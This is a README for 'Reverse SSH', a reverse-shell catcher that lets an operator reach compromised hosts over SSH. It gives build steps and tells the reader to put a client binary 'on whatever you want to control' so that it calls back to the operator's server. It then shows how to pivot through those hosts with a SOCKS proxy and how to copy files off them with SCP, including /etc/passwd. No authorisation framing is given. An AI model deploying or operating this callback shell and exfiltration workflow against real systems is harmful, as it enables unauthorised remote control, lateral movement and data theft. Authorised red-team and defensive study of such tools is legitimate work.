# Reverse SSH

Ever wanted to use SSH to talk to your reverse shells? Well now you can. Essentially works like any reverse shell catcher thing. 
You, the human client connect to the reverse shell catcher with ssh, and then select which remote host you want to connect to. 

```
                    +----------------+                 +---------+
                    |                |                 |         |
                    |                |       +---------+ Shelled |
                    |    Reverse     |       |         |  Client |
                    |  Connection    |       |         |         |
                    |    Catcher     |       |         +---------+
+---------+         |                |       |
|         |         |                |       |
| Human   |         |                |  SSH  |         +---------+
| Client  +-------->+                <-----------------+         |
|         |         |                |       |         | Shelled |
+---------+         |                |       |         |  Client |
                    |                |       |         |         |
                    |                |       |         +---------+
                    |                |       |
                    |                |       |
                    +----------------+       |         +---------+
                                             |         |         |
                                             |         | Shelled |
                                             +---------+  Client |
                                                       |         |
                                                       +---------+
```


## Setup Instructions


```
make
```

Make will build both the `client` and `server` binaries. It will also generate a private key for the `client`, and copy it to the `authorized_controllee_keys` file.
If you need to build the client for a different architecture. 

```
GOOS=linux GOARCH=amd64 make client
```


You will need to create an `authorized_keys` file, containing *your* public key. 
This will allow you to control whatever server catches. 
```
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232 #Set the server to listen on port 3232
```

Put the client binary on whatever you want to control. 
```
./client yourserver.com:3232
```

Then connect to your reverse shell catcher server:

```
ssh yourserver.com -p 3232
```

## Features

### Proxy

Using just the general dynamical forward `-D` flag you can proxy to your controlled hosts.

First you connect to your reverse shell catcher.

```
ssh -D 9050 catcher.com -p 3232
```

Then use the `proxy connect <remote_id>` command to connect to your reverse shell. 

```
catcher$ proxy connect 0bda3b12d3ce83f895632d412261073dc93dba3e 
Connected: 0bda3b12d3ce83f895632d412261073dc93dba3e
catcher$ 
```
After this, just point your tools/web browser to the socks5 port open on your local machine (in this example on port 9050) and you're away laughing.

You can obviously only proxy to one host at a time.


### SCP

You can transfer files to and from your controlled hosts using SCP. Essentially you address which host you want to download/upload to by `<ip_address>:<remote_id>:/path/here`.

e.g to upload the directory test to the host `0be2782caae4bedff780e14526f7618ab61e24fa`:
```
scp -r -P 3232 test catcher.com:0be2782caae4bedff780e14526f7618ab61e24fa:$(pwd -P)/test2
```

Or to download `/etc/passwd` from a host:

```
scp -P 3232 test catcher.com:0be2782caae4bedff780e14526f7618ab61e24fa:/etc/passwd
```

### Shell

On connection you will be presented by a list of controllable clients, e.g:
```
catcher$ ls
                    Targets
---------------------------------------------------------------------
| ID                                       | Hostname | IP Address  |
---------------------------------------------------------------------
| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | wombo  | [::1]:45150 |
---------------------------------------------------------------------
```

Use `help` or press `tab` to view commands.  
Tab will auto complete entries. 
So you you wanted to connect to the client given in the example: 
```
> connect a<TAB>
```
Will auto complete the entry for you and on enter will connect you to your reverse shell. 

## Limitations

This doesnt work entirely correctly for windows programs, due to limitations of the windows platform. But you can still run commands. 
Although they might not end properly, or be ctrl+c-able

